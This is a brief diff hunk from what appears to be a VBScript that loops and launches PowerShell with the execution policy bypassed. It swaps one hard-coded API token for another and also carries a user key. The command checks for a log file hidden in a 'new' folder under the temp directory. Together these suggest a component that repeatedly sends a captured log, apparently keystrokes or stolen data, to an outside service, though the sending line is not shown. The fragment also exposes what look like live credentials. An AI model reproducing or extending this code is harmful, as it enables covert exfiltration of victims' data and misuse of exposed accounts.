@@ -19,7 +19,7 @@ End If
 Do
     ' Define PowerShell script (only this part loops)
     psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _ 
-        """$API_TOKEN='a4mbuegdv65j65d9buc4bzxezrsf4w'; " & _ 
+        """$API_TOKEN='a7apgvyetoayv26hfoh15t11axi6mp'; " & _ 
         "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _ 
         "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'new','log.txt'); " & _ 
         "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _ 
